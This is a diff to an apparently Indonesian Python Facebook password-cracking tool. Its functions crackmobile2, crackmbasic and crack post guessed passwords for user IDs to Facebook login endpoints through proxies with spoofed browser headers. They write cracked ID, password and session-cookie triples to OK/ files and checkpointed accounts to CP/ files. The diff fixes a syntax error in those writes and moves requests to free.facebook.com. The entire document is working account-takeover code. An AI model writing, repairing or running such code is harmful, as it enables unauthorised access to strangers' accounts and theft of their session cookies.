@@ -696,7 +696,7 @@ def crackmobile2(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				prints(Panel(f"""{H2}{idf}={pw}
 {kuki}"""))
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki'\n')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				
 				cek_apk(session,coki)
 				break
@@ -726,12 +726,12 @@ def crackmbasic(idf,pwv):
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
 			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fwww.ekingsnews.com%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
-			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x}{K}{idf}|{pw}')
-				print(f'\r {x}{M}{ua}{M}\n')
+				print(f'\r {x}{M}{M}\n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				#os.popen('play-audio data/cp.mp3')
+				#os.popen('')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -740,7 +740,7 @@ def crackmbasic(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r{H}{idf}|{pw}|{kuki}')
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki'\n')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				
 				cek_apk(session,coki)
 				break
@@ -774,7 +774,7 @@ def crack(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cetak(nel(f"ACCOUNT {cpc}"))
 				print(f'\r{x}{K}{idf}|{pw}')
-				print(f'\r {x}{B}{ua}{M}\n')
+				print(f'\r {x}{B}{M}\n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -786,7 +786,7 @@ def crack(idf,pwv):
 				cetak(nel(f"ACCOUNT {okc}"))
 				print(f'\r{H}{idf}|{pw}')
 				print(f'\r{U}{kuki}{H}')
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki'\n')
+				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				
 				cek_apk(session,coki)
 				break
